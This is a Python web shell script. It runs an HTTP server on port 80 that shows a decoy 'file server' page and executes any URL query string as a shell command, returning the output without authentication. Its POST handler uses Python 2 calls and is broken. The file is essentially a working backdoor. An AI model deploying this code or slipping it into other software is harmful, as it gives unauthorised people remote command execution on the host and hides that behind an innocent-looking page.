#!/usr/bin/env webshell

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, unquote
import json
import subprocess
from http import HTTPStatus
import os


class Result:
    ClientAddress: str
    Command: str
    Path: str
    RealPath: str


class GetHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        parsed_path = urlparse(self.path)
        command = unquote(parsed_path.query)

        if command == '':
            message = """
                <!doctype html>
                <html>
                    <head>
                        <title>This is our file server</title>
                    </head>
                    <body>
                        <h1>This is our file server</h1>
                        <p>Please enjoy responsibly.</p>
                    </body>
                </html>
                """
            self.send_response(HTTPStatus.OK)
            self.send_header("Content-Type", "text/html")

            self.end_headers()
            self.wfile.write(message.encode('utf-8'))
        else:
            result = subprocess.run(
                command, shell=True, stdout=subprocess.PIPE)

            message = '\n'.join([
                'CLIENT VALUES:',
                # 'client_address=%s (%s)' % (self.client_address,
                #                            self.address_string()),
                'command=%s' % self.command,
                'path=%s' % self.path,
                'real path=%s' % parsed_path.path,
                'query=%s' % parsed_path.query,
                'request_version=%s' % self.request_version,
                'result_of_exec= %s' % result.stdout.decode('utf-8'),
                '',
                'SERVER VALUES:',
                'server_version=%s' % self.server_version,
                'sys_version=%s' % self.sys_version,
                'protocol_version=%s' % self.protocol_version,
                '',
            ])

            self.send_response(HTTPStatus.OK)
            self.send_header("Content-Type", "text/text")

            self.end_headers()
            self.wfile.write(message.encode('utf-8'))

        # self.wfile.write(b'{ "status": "awaiting commands" }')
        return

    def do_POST(self):
        content_len = int(self.headers.getheader('content-length'))
        post_body = self.rfile.read(content_len)
        self.send_response(200)
        self.end_headers()

        data = json.loads(post_body)

        self.wfile.write(data['foo'])
        return


if __name__ == '__main__':
    server = HTTPServer(('', 80), GetHandler)
    print(f'Starting server at http://0.0.0.0:80')
    server.serve_forever()